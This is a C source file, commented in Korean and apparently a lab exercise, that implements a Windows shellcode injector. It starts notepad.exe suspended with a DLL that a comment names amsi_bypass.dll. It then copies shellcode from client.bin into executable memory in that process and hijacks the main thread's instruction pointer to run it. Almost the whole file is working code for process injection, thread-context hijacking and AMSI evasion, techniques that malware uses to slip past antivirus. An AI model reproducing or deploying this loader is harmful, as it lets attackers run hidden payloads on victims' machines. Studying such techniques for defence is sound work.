#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "detours.h"

#include <stdio.h>
#include <stdlib.h>
#include <amsi.h>


  //=======================================================================================

int main(int argc, char* argv[]) {

   if (argc != 2) {
    fprintf(stderr,
            "Usage: %s <observer.dll>\n",
            argv[0]);
    return 1;
}

    FILE *fp = fopen("client.bin", "rb");

    if (fp == NULL) {
        perror("fopen");
        return 1;
    }


    // 파일 끝으로 이동
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek");
        fclose(fp);
        return 1;
    }


    // hello_donut.bin 전체 파일 크기
    long size = ftell(fp);

    if (size <= 0) {
        fclose(fp);
        fprintf(stderr, "invalid file size\n");
        return 1;
    }


    // 다시 파일 처음으로 이동
    rewind(fp);


    // ============================================================
    // loader.bin 내용을 담을 현재 프로세스의 heap buffer
    // ============================================================

    unsigned char *buffer =
        (unsigned char *)malloc((size_t)size);

    if (buffer == NULL) {
        fclose(fp);
        fprintf(stderr, "malloc failed\n");
        return 1;
    }


    size_t read_size =
        fread(
            buffer,
            1,
            (size_t)size,
            fp
        );


    fclose(fp);


    if (read_size != (size_t)size) {

        free(buffer);

        fprintf(
            stderr,
            "fread failed: %zu / %ld bytes\n",
            read_size,
            size
        );

        return 1;
    }


    printf(
        "[+] client.bin 로드 완료: %zu bytes\n",
        read_size
    );


    SIZE_T allocation_size =
        (SIZE_T)read_size;

//================================================================================================================
    char target_path[] = "C:\\Windows\\System32\\notepad.exe";  
    char dll_path[MAX_PATH];

     DWORD dll_length = GetFullPathNameA(
        argv[1], //DLLPATH
        MAX_PATH,
        dll_path,
        NULL
    );

    if (dll_length == 0 || dll_length >= MAX_PATH) {
        fprintf(stderr, "[launcher] Invalid path\n");
        return 3;
    }

    char command_line[MAX_PATH * 2];

    _snprintf_s(
        command_line,
        sizeof(command_line),
        _TRUNCATE,
        "\"%s\"",
        target_path
    );

    STARTUPINFOA startup = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    startup.cb = sizeof(startup);

    LPCSTR dlls[1] = {
        dll_path
    };

    /*
     * Notepad.exe를 suspended 상태로 생성하면서
     * amsi_bypass.dll이 시작 시 로드되도록 등록한다.
     */
    BOOL created = DetourCreateProcessWithDllsA(
        target_path,
        command_line,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &startup,
        &pi,
        1,
        dlls,
        NULL
    );

    if (!created) {
        fprintf(
            stderr,
            "[launcher] Process creation failed: %lu\n",
            (unsigned long)GetLastError()
        );
        return 4;
    }

    fprintf(
        stderr,
        "[launcher] PID %lu created suspended\n",
        (unsigned long)pi.dwProcessId
    );


    fprintf(
        stderr,
        "[launcher] Waiting 2 seconds while suspended\n"
    );

    Sleep(2000);

    fprintf(stderr, "[launcher] Resuming target\n");

    //스레드 시작
    DWORD previous_count =
        ResumeThread(pi.hThread);

    if (previous_count == (DWORD)-1) {
        fprintf(stderr,
                "[launcher] ResumeThread failed: %lu\n",
                (unsigned long)GetLastError());

        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 5;
    }
        

    printf("[launcher] Target running\n");

    Sleep(2000);

    printf("[launcher] Suspending target\n");

//-----------------------------------------------------------------------------------------------------------------
DWORD state = WaitForSingleObject(pi.hThread, 0);

if (state == WAIT_OBJECT_0) {
    printf("[debug] original primary thread already exited\n");
}
else if (state == WAIT_TIMEOUT) {
    printf("[debug] original primary thread is still alive\n");
}
else {
    printf("[debug] wait failed: %lu\n", GetLastError());
}
//-------------------------------------------------------------------------------------------------------------------

    DWORD suspend_count = SuspendThread(pi.hThread);

    if (suspend_count == (DWORD)-1) {
        fprintf(stderr,
                "[launcher] SuspendThread failed: %lu\n",
                (unsigned long)GetLastError());
    }
    //=======================================================================================

    // =====================================================================
    // 2단계: 대상 프로세스 내부에 새로운 RW 메모리 영역 생성
    // =====================================================================

    printf(
        "[*] 2단계: 대상 프로세스에 메모리 할당\n"
    );


    void *remote_memory =
        VirtualAllocEx(

            pi.hProcess,              // 메모리를 만들 대상 프로세스

            NULL,                     // 주소는 Windows가 선택

            allocation_size,          // [수정] 실제 읽은 파일 크기

            MEM_RESERVE |
            MEM_COMMIT,               // 예약 + commit

            PAGE_EXECUTE_READWRITE           // 읽기/쓰기 데이터 영역
        );


    if (remote_memory == NULL)
    {
        printf(
            "[-] VirtualAllocEx 실패. Error=%lu\n",
            GetLastError()
        );


        free(buffer);

        TerminateProcess(
            pi.hProcess,
            0
        );

        CloseHandle(
            pi.hThread
        );

        CloseHandle(
            pi.hProcess
        );


        return 1;
    }


    printf(
        "[+] 원격 메모리 할당 성공!\n"
    );


    printf(
        "[+] Remote Address  = %p\n",
        remote_memory
    );


    printf(
        "[+] Allocation Size = %zu bytes\n",
        (size_t)allocation_size
    );


    printf(
        "[+] Protection      = PAGE_EXECUTE_READWRITE\n"
    );

    // ============================================================
    // [수정된 부분] 함수 선언이 아닌 '실제 호출'을 해야 합니다.
    // ============================================================
    SIZE_T bytesWritten = 0;
    
    printf("[*] 3단계: 할당된 원격 메모리에 버퍼 내용 쓰기\n");

    if (!WriteProcessMemory(
            pi.hProcess,      // 1. 타겟 프로세스 핸들 (CreateProcess로 얻은 핸들)
            remote_memory,    // 2. 데이터를 쓸 원격 메모리 주소 (VirtualAllocEx 반환값)
            buffer,           // 3. 로컬 버퍼 (loader.bin 내용이 담긴 힙 영역)
            allocation_size,  // 4. 쓸 데이터 크기 (읽어들인 파일 크기)
            &bytesWritten     // 5. 실제로 쓰인 바이트 수
        )) 
    {
        printf("[-] WriteProcessMemory 실패. Error=%lu\n", GetLastError());
        
        // 실패 시 자원 정리
        VirtualFreeEx(pi.hProcess, remote_memory, 0, MEM_RELEASE);
        free(buffer);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    printf("[+] 원격 메모리에 데이터 쓰기 성공! (Written: %zu bytes)\n", bytesWritten);


    printf("[*] 4단계: 스레드 문맥(Context) 가로채기\n");
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL; // 또는 CONTEXT_CONTROL 플래그만 써도 EIP/RIP 조작 가능

    if (GetThreadContext(pi.hThread, &ctx)) {
        
        // ★ 핵심 포인트: EAX/RCX가 아닌, '다음에 실행할 명령어 주소'인 EIP/RIP를 직접 덮어버림
#ifdef _WIN64
        printf("    [64비트] 기존 RIP: 0x%llX -> 변경된 RIP: 0x%p\n", ctx.Rip, remote_memory );
        ctx.Rip = (DWORD64)remote_memory ;
#else
        printf("    [32비트] 기존 EIP: 0x%lX -> 변경된 EIP: 0x%p\n", ctx.Eip, remote_memory );
        ctx.Eip = (DWORD)remote_memory ;
#endif
        // 조작된 뇌(Context)를 다시 이식
        if (SetThreadContext(pi.hThread, &ctx)) {
            printf("[+] 스레드 문맥 덮어쓰기 성공.\n");

            printf("[*] 5단계: 스레드 깨우기 (ResumeThread)\n");
            // 스레드가 깨어나자마자 우리가 할당한 공간(allocatedMemory)의 쉘코드를 강제로 실행합니다.
            ResumeThread(pi.hThread);
            printf("[+] 쉘코드 실행 시작!\n");
        } else {
            printf("[-] SetThreadContext 실패. 에러: %lu\n", GetLastError());
        }
    } else {
        printf("[-] GetThreadContext 실패. 에러: %lu\n", GetLastError());
    }



    printf(
        "[*] Enter를 누르면 메모리를 해제하고 종료합니다.\n"
    );


    getchar();



    // ============================================================
    // 3단계: 우리가 만든 원격 메모리 해제
    // ============================================================

    if (!VirtualFreeEx(
            pi.hProcess,
            remote_memory,
            0,
            MEM_RELEASE))
    {
        printf(
            "[-] VirtualFreeEx 실패. Error=%lu\n",
            GetLastError()
        );
    }
    else
    {
        printf(
            "[+] 원격 메모리 해제 완료\n"
        );
    }

    // ============================================================
    // [수정]
    // malloc()으로 만든 현재 프로세스의 buffer도 해제해야 함.
    //
    // VirtualFreeEx는 remote_memory만 해제함.
    // ============================================================

    free(buffer);

    // ============================================================
    // suspended 프로세스 종료
    // ============================================================

    TerminateProcess(
        pi.hProcess,
        0
    );

    // ============================================================
    // 프로세스 / 스레드 HANDLE 정리
    // ============================================================

    CloseHandle(
        pi.hThread
    );


    CloseHandle(
        pi.hProcess
    );


    printf(
        "[+] 실습 종료\n"
    );


    return 0;
}